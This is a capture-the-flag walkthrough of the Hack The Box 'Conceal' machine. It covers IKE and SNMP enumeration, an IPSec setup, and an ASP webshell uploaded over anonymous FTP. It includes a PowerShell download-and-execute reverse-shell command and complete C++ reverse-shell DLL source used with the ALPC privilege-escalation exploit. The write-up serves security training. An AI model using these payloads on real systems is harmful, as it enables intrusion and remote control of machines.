---
layout: single
title: Conceal - Hack The Box
excerpt: "Conceal is a hard difficulty windows machine which teaches enumeration of IKE protocol and configuration of IPSec in transprt mode. Once configured and we can bypass the firewall and  shell can be uploaded via FTP and executed. On listing the hotfxes the box is found vulnerable to ALPC TASK Scheduler LPE. Alternatively, SeImpersonatePrivilege granted to the user allows to obtain a SYSTEM shell."
date: 2020-04-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-conceal/conceal_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - OSCP
  - ALCP
  - IKE
  - IPSEC
  - JuicyPotato
---

![](/assets/images/htb-writeup-conceal/conceal_logo.png)

## Synopsis
Conceal is a hard difficulty windows machine which teaches enumeration of `IKE` protocol and configuration of `IPSec` in `transprt` mode. Once configured and we can bypass the `firewall` and  shell can be uploaded via `FTP` and executed. On listing the hotfixes the box is found vulnerable to `ALPC TASK Scheduler LPE`. Alternatively, `SeImpersonatePrivilege` granted to the user allows to obtain a `SYSTEM` shell.

## Skills Required
* Networking
* Windows Enumeration

## Skills Learned
* IKE Configuration
 
---
## Enumeration
### Nmap
Performing a Full port `TCP` scan didn't yield us anything. So, well do full `UDP` scan. we found port `500` to be open.
```java
# Nmap 7.80 scan initiated Thu Apr 16 09:41:27 2020 as: nmap -Pn -sC -sV -sU -v -p500 -oN udp.nmap conceal.htb
Nmap scan report for conceal.htb (10.10.10.116)
Host is up.

PORT    STATE         SERVICE VERSION
500/udp open|filtered isakmp
|_ike-version: ERROR: Script execution failed (use -d to debug)
```

`IKE` stands for `Internet Key Exchange` which is used to establish a secure connection in the `IPSec` protocol.

I'll run `nmap` `udp` scan on the top 20 ports with the standard scripts enabled. The scripts are more likely to get a responses from an open port. 
```java
# Nmap 7.80 scan initiated Thu Apr 16 10:50:33 2020 as: nmap -sU -sC --top-ports 20 -oN top.nmap 10.10.10.116
Nmap scan report for conceal.htb (10.10.10.116)
Host is up (0.19s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:a6:7c (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 160.31 Kb sent, 8.93 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:a6:7c (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 160.31 Kb sent, 8.94 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:a6:7c (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 160.31 Kb sent, 8.94 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:a6:7c (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 160.31 Kb sent, 8.94 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  0.0.0.0:52721        *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:51740   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:51741      *:*
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   68: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   308: 
|     Name: smss.exe
|   396: 
|     Name: csrss.exe
|   424: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   476: 
|     Name: wininit.exe
|   492: 
|     Name: csrss.exe
|   576: 
|     Name: winlogon.exe
|   596: 
|     Name: services.exe
|   628: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   680: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   700: 
|     Name: fontdrvhost.exe
|   708: 
|     Name: fontdrvhost.exe
|   724: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   820: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   916: 
|     Name: dwm.exe
|   932: 
|     Name: svchost.exe
|   964: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   972: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1040: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1068: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   1232: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1324: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1332: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1440: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1460: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   1488: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa3a48055 /state1:0x41c64e6d
|   1612: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   1688: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1708: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1744: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1796: 
|     Name: SecurityHealthService.exe
|   1816: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1828: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1848: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1872: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1888: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1896: 
|     Name: MsMpEng.exe
|   2028: 
|     Name: Memory Compression
|   2592: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   2692: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2832: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   3040: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3152: 
|     Name: NisSrv.exe
|   3360: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3624: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|_    Params: -k LocalServiceAndNoImpersonation
| snmp-sysdescr: Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 1h18m51.41s (473141 timeticks)
| snmp-win32-services: 
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Client License Service (ClipSVC)
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Account Sign-in Assistant
|   Microsoft FTP Service
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Workstation
|_  World Wide Web Publishing Service
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
|_  VMware Tools; 2018-10-12T20:11:02
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open          isakmp
|_ike-version: ERROR: Script execution failed (use -d to debug)
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
```
### IKESCAN
In order to configure `VPN` we'll need various parameters associated with it like the encryption algorithm, protocol, pre-shared key etc.
We've a tool called `ike-scan` which helps us to enumerate ike services and give us the required info.
```java
sudo ike-scan -M 10.10.10.116    

Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)                                          
10.10.10.116    Main Mode Handshake returned
        HDR=(CKY-R=3e70d673c7d08823)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) 
        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.205 seconds (4.87 hosts/sec).  1 returned handshake; 0 returned notify
```
`ike-scan` provided us the information like the `Encryption` used is `3DES`,`SHA1` hash algorithm and `IKE` verison which is `v1`. Another thing to be noted is the `Auth` parameter which needs a PSK.

### SNMPWALK
We'll use `SNMPWALK` to enumerate the network information with standard flags.
```java
snmpwalk -v 2c -c public 10.10.10.116
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (345982) 0:57:39.82
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.3 = INTEGER: 3
<SNIP>
```
The string `IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43` seems to be providing us a `IKE VPN Password` . Looking at the hash
``` 
echo -n 9C8B1A372B1878851BE2C097031B6E43 | wc -c
32
```
The password is `32` character long and it could be a `MD5` or `NTLM` hash. We'll go to [crackstaion](https://crackstation.net/) and see wether if we can crack it.

![](/assets/images/htb-writeup-conceal/crack.png)

And we're able to crack its successfully. The Results says it's a `NTLM` hash and the cracked password is `Dudecake1!`.

### StrongSwan Configuration
To establish the `vpn` connection we'll use [strongswan](https://www.strongswan.org/) which allows us to configure `IPSec`. we can install it using apt package manager `apt install -y strongswan`.

For the configuration we've to edit to files `/etc/ipsec.conf` and `/etc/ipsec.secrets` to connect.
As we know the `PSK` already we can configure it in `/etc/ipsec.secrets`.
```
echo '10.10.10.116 : PSK "Dudecake1!"' >> /etc/ipsec.secrets
```
It is in the format `source destination : PSK`, as the source is always us we can ignore it.

Next, we'll configure the `parameters` required to configure our `connection`. [strongswan documentation](https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection) consists of list of parameters available. The basic configuration looks like this.
```
conn Conceal
	type=transport
	keyexchange=ikev1
	right=10.10.10.116
	authby=psk
	rightprotoport=tcp
	leftprotoport=tcp
	esp=3des-sha1
	ike=3des-sha1-modp1024
	auto=start
```
Let's break this down.
* First we're declearing a connection named `Conceal` using `conn Conceal`.
* `type:` of connection is just `transport` as we're only encrypting the traffic and not creating a tunnel.
* `keyexchange:` parameter is used to specify the version of protocol to be used which we obtain previoulsy from `ike-scan` which is `v1`.
* `right:` parameter is used to specify destination host.
* `authby:` parameter will be `psk` obtained from `ike-scan`.
* `rightprotoport` and `leftprotoport` are used to define the portocol type in our case its `TCP`. since we're directly able to communicate with `UDP` Ports.
* `esp:` parameter specifies the cipher suite used in our case `3DES` and `SHA1`.
* `ike:` parameter same as `esp` . but here we even specify the group which is `modp1024`.

### Connection Establishment
We stop the `ipsec` service to kill all related process and start it in `nofork` mode in order to debug it.
```
sudo ipsec stop

sudo ipsec start --nofork

Starting strongSwan 5.8.2 IPsec [starter]...
00[DMN] Starting IKE charon daemon (strongSwan 5.8.2, Linux 5.4.0-kali4-amd64, x86_64)
00[CFG] loading ca certificates from '/etc/ipsec.d/cacerts'
00[CFG] loading aa certificates from '/etc/ipsec.d/aacerts'
00[CFG] loading ocsp signer certificates from '/etc/ipsec.d/ocspcerts'
00[CFG] loading attribute certificates from '/etc/ipsec.d/acerts'
00[CFG] loading crls from '/etc/ipsec.d/crls'
00[CFG] loading secrets from '/etc/ipsec.secrets'
00[CFG]   loaded IKE secret for 10.10.10.116
<SNIP>
```
Since we don't see any errors in the connnection . we can confirm that connnection is successful.

### Nmap
Running nmap again after successful connection lets us bypass the `firewall` and discover ports. we need to use `-sT` for a full connect scan.
```java
# Nmap 7.80 scan initiated Wed Apr 15 14:51:16 2020 as: nmap -Pn -sC -sV -v -p21,80,135,139,445,49664,49665,49666,49667,49668,49669,49670 -oN full.nmap conceal.htb
Nmap scan report for conceal.htb (10.10.10.116)
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m15s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-15T09:23:31
|_  start_date: 2020-04-15T03:51:49
```
Now, we're able to see the open ports like any normal `windows` box. `IIS` running on port `80` and `FTP` has `anonymous` login enabled.

### IIS 
Browsing to the page on port `80`. we're presented with a page which hosts a standard `IIS Installation` .

![](/assets/images/htb-writeup-conceal/iis.png)

Performing a quick `gobuster` on port `80` gave us a interesting folder.
```
gobuster dir -u http://10.10.10.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx -o http.txt -t 100

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.116/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     asp,aspx
[+] Timeout:        10s
===============================================================
2020/04/16 12:22:15 Starting gobuster
===============================================================
/upload (Status: 301)
```
We found an interesting directory `/upload`.

### FTP
FTP has anonymous login enabled.After logging in we are into an empty directory. let's put some files and test whether we can upload files to that directory.
```
echo pwned > test.html

ftp 10.10.10.116

Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:mah1ndra): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38268 bytes sent in 0.01 secs (3.0339 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-16-20  07:59AM                38268 test.html
226 Transfer complete.
```
We're able to successfully upload our files to ftp directory. Let's navigate to `/upload` endpoint on port `80` to see whether is it linked to `FTP`.

![](/assets/images/htb-writeup-conceal/upload.png)

To verify it we'll do `curl` to the endpoint to look at the output of `test.html`.
```
curl http://10.10.10.116/upload/test.html
pwned
```
So, We've verfied that we can upload and execute files on the server. We'll drop an `asp` webshell since its an `IIS` server.

## FootHold
we can execute `system commands` with asp scripts. we'll grab the simple `webshell.asp` from [tennc webshells](https://github.com/tennc/webshell/blob/master/asp/webshell.asp) and we'll upload it to `FTP`.
```
wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -o cmd.asp
```
```
ftp 10.10.10.116

Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:mah1ndra): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put cmd.asp
local: cmd.asp remote: cmd.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1407 bytes sent in 0.00 secs (444.0929 kB/s)
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
04-16-20  08:23AM                 1407 cmd.asp
226 Transfer complete.
```
Now, we can navigate to `http://10.10.10.116/upload/cmd.asp` to execute the commands.

![](/assets/images/htb-writeup-conceal/webshell.png)

## Shell as Destitute
We'll use  TCP reverse shell from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
```
wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 9001' >> Invoke-PowerShellTcp.ps1
```

Powershell command which we use on `cmd.asp` to Invoke our `ps1` reverse shell on to the system.
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')"
```

Executing the above `command` on `cmd.asp` gave as reverse shell as `Destitute user`.

![](/assets/images/htb-writeup-conceal/revshell.png)

## Privilege Escalation
Enumerating the machine. `systeminfo` provides us that its a `Microsoft Windows 10 Enterprise Build 15063` and in the `HotFix` section we see that nothing is patched.
```
PS C:\Windows\SysWOW64\inetsrv> systeminfo

Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          16/04/2020, 05:02:42
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,267 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,356 MB
Virtual Memory: In Use:    843 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::c9ad:74f3:d6e:a6c
                                 [03]: dead:beef::28fb:61b9:8d8:aefe
                                 [04]: dead:beef::c9ad:74f3:d6e:a6c
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
So, I uploaded `Watson` on to the machine and ran it. `Watson` Helps us to enumerate missing `KBs` and suggest exploits for useful Privilege Escalation vulnerabilites.
```
PS C:\tmp> ./watson.exe
  __    __      _                   
 / / /\ \ \__ _| |_ ___  ___  _ __  
 \ \/  \/ / _` | __/ __|/ _ \| '_ \ 
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|
                                   
                           v2.0    
                                   
                   @_RastaMouse

 [*] OS Build Number: 15063
 [*] Enumerating installed KBs...

 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/

 [*] Finished. Found 9 potential vulnerabilities.
```
### Windows ALPC Elevation of Privilege Vulnerability.
The box could be potentially vulnerable to `ALPC` Task Scheduler LPE [CVE-2018-8440](https://nvd.nist.gov/vuln/detail/CVE-2018-8440). One important condition for this exploit to work is the Read Execute access for Authenticated Users group on the C:\Windows\Tasks folder.
We can check those permisions using `icacls`.
```
PS C:\Windows\SysWOW64\inetsrv>icacls C:\Windows\Tasks
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
                 BUILTIN\Administrators:(F)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
### ALPC Scheduler LPE 
Having confirmed the permissions we can exploit the vulnerability.

We'll use the [ALPC DiagHub](https://github.com/realoriginal/alpc-diaghub) exploit. which combines the ALPC exploit with DiagHub Service to execute the DLL.

First, we need to donwload `64 bit` version  of `Alpc` exe and then compilea `DLL` using mingw. Here's a sample code which sends a reverse shell using sockets on windows. It creates a socket, sends back a connect, runs the command and stores in a buffer to return the output.
```cpp
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

#define REMOTE_ADDR "10.10.14.24"
#define REMOTE_PORT "443"

void revShell();

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
{
        switch(dwReason)
        {
                case DLL_PROCESS_ATTACH:
			                  revShell();
                        break;
                case DLL_PROCESS_DETACH:
                        break;
                case DLL_THREAD_ATTACH:
                        break;
                case DLL_THREAD_DETACH:
                        break;
        }

        return 0;
}
void revShell()
{
	FreeConsole();
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL,	*ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);	
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL,	NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}
```
We need to change `Port` and `IP` and compile the `dll`.
```
x86_64-w64-mingw32-g++ rs.cpp -o rs.dll -lws2_32 -shared
```

Then transfer the `dll`(rs.dll) and the binary (alpc.exe) to the machine and then execute them .
```
cmd /c alpc.exe rs.dll .\lol.rtf
```
After executing the command it freezes and .
```
PS C:\tmp> cmd /c alpc.exe rs.dll .\lol.rtf

```
Checking our `nc` listener we get shell as `SYSTEM`.

![](/assets/images/htb-writeup-conceal/system.png)

## Alternate Privesc 
### Juicy Potato
Looking at the privilegees of the user we notice that `SeImpersonate` is enabled. 
```
PS C:\tmp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
